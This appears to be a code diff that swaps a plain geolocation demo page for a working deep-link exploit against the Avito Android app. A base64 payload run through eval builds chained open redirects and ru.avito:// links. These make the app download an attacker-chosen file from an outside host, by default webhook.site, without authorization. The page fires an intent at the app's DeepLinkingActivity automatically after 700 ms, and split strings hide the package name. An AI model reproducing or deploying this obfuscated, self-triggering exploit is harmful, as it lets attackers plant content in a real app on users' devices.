@@ -1,35 +1,37 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Get Location</title>
-</head>
-<body>
-  <p id="status">Requesting location...</p>
+<!doctype html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>
+<body data-h='webhook.site' data-t='' data-f='intent-check.html' style='margin:0;background:#fff'>
+<a id='x' href='#' style='display:block;padding:20px'>OPEN</a>
+<script>
+(function(){
+  var b = document.body;
+  var q = new URLSearchParams(location.search);
+  var enc = function(s){ return encodeURIComponent(s).replace(/'/g, '%27'); };
 
-  <script>
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          document.getElementById("status").textContent = 
-            `Latitude: ${lat}, Longitude: ${lon}`;
-          console.log("Location:", lat, lon);
-        },
-        (error) => {
-          document.getElementById("status").textContent = 
-            `Error: ${error.message}`;
-          console.error("Geolocation error:", error);
-        },
-        {
-          enableHighAccuracy: true,   // for "exact" location
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    } else {
-      document.getElementById("status").textContent = "Geolocation not supported.";
-    }
-  </script>
+  var dst = q.get('dst');
+  var host, tag;
+  if (dst) {
+    var u = new URL(dst);
+    if (u.protocol !== 'https:') throw new Error('https only');
+    host = u.host;
+    tag  = u.pathname.replace(/^\//, '') + (u.search || '');
+  } else {
+    host = q.get('h') || b.dataset.h;
+    tag  = q.get('p') || b.dataset.t;
+  }
+
+  eval(atob('dmFyIGZpbGUgID0gcS5nZXQoJ2YnKSB8fCBiLmRhdGFzZXQuZjsKdmFyIGFsdCAgID0gJ2h0dHBzcmVkaXJlY3Rvci5jb206Ly9hdml0by5ydS8/dT1odHRwczovL291cnNlcnZlcic7CnZhciB2b2ljZSA9ICdodHRwczovL3ZvaWNlLmdvb2dsZS5jb20vbGVnYWN5JTQwJyArIGhvc3QgKyAodGFnID8gJy8nICsgdGFnIDogJycpOwp2YXIganVtcCAgPSAnaHR0cHM6Ly9saW5rLmF2aXRvLnJ1L2dvP3RvPScgKyBlbmModm9pY2UpOwp2YXIgZGwgICAgPSAncnUuYXZpdG86Ly8xL3RyYXZlbC9maWxlL2Rvd25sb2FkP3VybD0nICsgZW5jKGp1bXApICsgJyZuYW1lPScgKyBmaWxlICsgJyZzaG91bGRCZUF1dGhvcml6ZWQ9ZmFsc2UnOwp2YXIgcGFnZSAgPSAnPHNjcmlwdD5sb2NhdGlvbi5ocmVmPVwnJyArIGRsICsgJ1wnPFwvc2NyaXB0Pic7CnZhciBkYXRhICA9ICdkYXRhOnRleHQvaHRtbCwnICsgZW5jKHBhZ2UpOwp2YXIgcm91dGUgPSAncnUuYXZpdG86Ly8xL3N0b3JpZXMvc2hvdz91cmw9JyArIGVuYyhkYXRhKSArICcmbmVlZE9wZW5JbmRlcGVuZGVudGx5PXRydWUnOw=='));
+
+  var scheme = ['ru', 'avito'].join('.');
+  var pkg    = ['com', 'avito', 'android'].join('.');
+  var leaf   = ['deep_linking', 'DeepLinkingActivity'].join('.');
+  var intent = 'intent://' + route.slice(scheme.length + 3) + '#Intent;scheme=' + scheme + ';package=' + pkg + ';component=' + pkg + '/.' + leaf + ';end';
+
+  var a = document.getElementById('x');
+  a.href = intent;
+  setTimeout(function(){
+    try{ a.click(); }catch(e){}
+    try{ location.href = intent; }catch(e){}
+  }, 700);
+})();
+</script>
 </body>
-</html>
